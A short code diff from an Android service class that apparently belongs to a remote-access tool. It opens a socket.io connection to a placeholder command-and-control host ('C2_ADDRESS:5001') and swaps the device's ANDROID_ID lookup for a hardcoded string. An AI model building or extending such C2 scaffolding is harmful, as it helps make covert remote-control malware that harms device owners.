@@ -30,8 +30,8 @@ import io.socket.emitter.Emitter;
 public class MainService extends Service {
 
     Socket ioSocket = IO.socket(URI.create("http://C2_ADDRESS:5001"));
-    @SuppressLint("HardwareIds") String device_id = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
-
+//    @SuppressLint("HardwareIds") String device_id = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
+    String device_id = "device_id";
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         final Handler handler = new Handler();
